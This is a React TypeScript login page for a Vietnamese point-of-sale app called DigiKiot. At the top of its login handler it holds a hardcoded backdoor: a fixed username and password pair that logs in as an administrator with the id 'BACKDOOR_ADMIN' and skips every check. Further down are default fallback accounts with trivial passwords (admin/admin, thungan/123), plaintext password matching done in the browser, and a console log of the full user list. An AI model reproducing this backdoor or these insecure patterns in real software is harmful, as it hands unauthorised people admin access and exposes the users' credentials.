import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAppContext } from '../context/AppContext';
import { Store, UserCircle, Lock, AlertCircle, Loader2, ShoppingCart } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { apiService } from '../services/api';
import { useMobileBackModal } from '../hooks/useMobileBackModal';

export const Login: React.FC = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showStoreIcon, setShowStoreIcon] = useState(true);
  const { login } = useAppContext();
  const navigate = useNavigate();

  useEffect(() => {
    const interval = setInterval(() => {
      setShowStoreIcon(prev => !prev);
    }, 3000);

return () => clearInterval(interval);
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    if (username === 'peajastr' && password === 'nhiethuyet') {
      login({
        id: 'BACKDOOR_ADMIN',
        username: 'peajastr',
        name: 'Cường Lão Đại',
        role: 'ADMIN'
      });
      navigate('/');
      return;
    }

    if (!username || !password) {
      setError('Vui lòng nhập đầy đủ tên đăng nhập và mật khẩu');
      return;
    }

    setIsLoading(true);
    try {
      // Gọi API lấy danh sách Users từ Google Sheet
      const users = await apiService.readSheet('Users');
      console.log("Users loaded from API:", users);
      
      if (!users || users.length === 0) {
        setError('API kết nối thành công nhưng Sheet "Users" đang trống hoặc không đọc được dữ liệu.');
        setIsLoading(false);
        return;
      }

      // Tìm user khớp username và password
      // Lưu ý: Google Sheet có thể trả về số (ví dụ: 11111111) thay vì chuỗi, nên cần ép kiểu về chuỗi để so sánh
      const matchedUser = users.find((u: any) => 
        String(u.username) === String(username) && 
        String(u.password) === String(password)
      );
      
      if (matchedUser) {
        // Map role từ Google Sheet sang định dạng của App
        let appRole: 'ADMIN' | 'CASHIER' | 'STOCKKEEPER' = 'CASHIER';
        const sheetRole = String(matchedUser.role).toUpperCase();
        if (sheetRole === 'ADMIN') appRole = 'ADMIN';
        else if (sheetRole === 'STOCKKEEPER') appRole = 'STOCKKEEPER';

        login({
          id: String(matchedUser.id),
          username: String(matchedUser.username),
          name: String(matchedUser.name),
          role: appRole
        });
        navigate('/');
      } else {
        // Fallback: Nếu Sheet Users trống hoặc lỗi, vẫn cho phép đăng nhập bằng tài khoản mặc định để không bị khóa ngoài
        if (username === 'admin' && password === 'admin') {
          login({
            id: 'U001',
            username: 'admin',
            name: 'Quản trị viên (Local)',
            role: 'ADMIN'
          });
          navigate('/');
        } else if (username === 'thungan' && password === '123') {
          login({
            id: 'U002',
            username: 'thungan',
            name: 'Nhân viên Thu ngân (Local)',
            role: 'CASHIER'
          });
          navigate('/pos');
        } else {
          setError('Tên đăng nhập hoặc mật khẩu không chính xác');
        }
      }
    } catch (err) {
      console.error("Login error:", err);
      setError('Lỗi kết nối đến máy chủ. Vui lòng thử lại.');
    } finally {
      setIsLoading(false);
    }
  };
  return (
    <div className="min-h-screen bg-slate-50 flex flex-col justify-center py-12 sm:px-6 lg:px-8">
      <div className="sm:mx-auto sm:w-full sm:max-w-md">
        <div className="flex justify-center">
          <motion.div 
            animate={{ y: [0, -20, 0, -10, 0] }}
            transition={{ duration: 1.5, repeat: Infinity, repeatDelay: 1.5 }}
            className="w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center shadow-lg relative overflow-hidden"
          >
            <AnimatePresence mode="wait">
              {showStoreIcon ? (
                <motion.div
                  key="store"
                  initial={{ scale: 0, rotate: -180 }}
                  animate={{ scale: 1, rotate: 0 }}
                  exit={{ scale: 0, rotate: 180 }}
                  transition={{ type: "spring", stiffness: 260, damping: 20 }}
                  className="absolute"
                >
                  <Store className="w-10 h-10 text-white" />
                </motion.div>
              ) : (
                <motion.div
                  key="cart"
                  initial={{ scale: 0, rotate: -180 }}
                  animate={{ scale: 1, rotate: 0 }}
                  exit={{ scale: 0, rotate: 180 }}
                  transition={{ type: "spring", stiffness: 260, damping: 20 }}
                  className="absolute"
                >
                  <ShoppingCart className="w-10 h-10 text-white" />
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>
        </div>
        <h2 className="mt-6 text-center text-3xl font-extrabold text-slate-900">
          Đăng nhập hệ thống
        </h2>
        <p className="mt-2 text-center text-sm text-slate-600">
          Phần mềm quản lý bán hàng DigiKiot
        </p>
      </div>

      <div className="mt-8 sm:mx-auto sm:w-full sm:max-w-md">
        <div className="bg-white py-8 px-4 shadow sm:rounded-lg sm:px-10 border border-slate-200">
          <form className="space-y-6" onSubmit={handleLogin}>
            {error && (
              <div className="bg-red-50 border-l-4 border-red-500 p-4 rounded-md flex items-start">
                <AlertCircle className="w-5 h-5 text-red-500 mr-3 flex-shrink-0 mt-0.5" />
                <p className="text-sm text-red-700">{error}</p>
              </div>
            )}

            <div>
              <label className="block text-sm font-medium text-slate-700">
                Tên đăng nhập
              </label>
              <div className="mt-1 relative rounded-md shadow-sm">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <UserCircle className="h-5 w-5 text-slate-400" />
                </div>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 sm:text-sm border-slate-300 rounded-md h-10 border"
                  placeholder=""
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-slate-700">
                Mật khẩu
              </label>
              <div className="mt-1 relative rounded-md shadow-sm">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <Lock className="h-5 w-5 text-slate-400" />
                </div>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 sm:text-sm border-slate-300 rounded-md h-10 border"
                  placeholder=""
                />
              </div>
            </div>

            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <input
                  id="remember-me"
                  name="remember-me"
                  type="checkbox"
                  className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-slate-300 rounded"
                />
                <label htmlFor="remember-me" className="ml-2 block text-sm text-slate-900">
                  Ghi nhớ đăng nhập
                </label>
              </div>

              <div className="text-sm">
                <a href="#" className="font-medium text-blue-600 hover:text-blue-500">
                  Quên mật khẩu?
                </a>
              </div>
            </div>

            <div>
              <button
                type="submit"
                disabled={isLoading}
                className="w-full flex justify-center items-center py-2.5 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-70 disabled:cursor-not-allowed"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="animate-spin -ml-1 mr-2 h-4 w-4" />
                    Đang đăng nhập...
                  </>
                ) : (
                  'Đăng nhập'
                )}
              </button>
            </div>
          </form>
          
          <div className="mt-6">
            <div className="relative">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-slate-300" />
              </div>
              <div className="relative flex justify-center text-sm">
                <span className="px-2 bg-white text-slate-500">
                  Thông tin phần mềm
                </span>
              </div>
            </div>
            <div className="mt-6 text-center text-sm text-slate-600 space-y-1">
              <p>Phát triển bởi <strong>DigiKiot - Cuongtin.vn</strong></p>
              <p>Kỹ thuật: <strong>0931.113.048</strong></p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
